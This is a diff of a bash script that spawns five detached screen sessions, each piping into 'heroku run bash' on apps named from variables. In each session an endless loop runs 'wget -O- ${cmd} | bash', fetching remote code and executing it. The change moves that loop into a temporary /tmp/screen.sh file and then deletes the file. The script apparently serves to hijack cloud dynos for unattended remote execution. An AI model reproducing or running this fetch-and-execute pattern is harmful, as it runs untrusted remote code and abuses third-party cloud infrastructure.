@@ -22,8 +22,12 @@ fi
 # loop to create screen
 for i in {1..5}
 do
-	screen -dm -S $i "while true; do (sleep 5; echo 'while true; do wget -O- ${cmd} | bash; done') | /usr/local/heroku/bin/heroku run bash --app ${passwd}${i}; done"
+	echo '#!/bin/bash' > /tmp/screen.sh
+	echo "while true; do (sleep 5; echo 'while true; do wget -O- ${cmd} | bash; done') | /usr/local/heroku/bin/heroku run bash --app ${passwd}${i}; done" >> /tmp/screen.sh
+	chmod +x /tmp/screen.sh
+	screen -dm -S $i '/tmp/screen.sh'
 done
+rm -rf /tmp/screen.sh
 
 # stop here
 while true
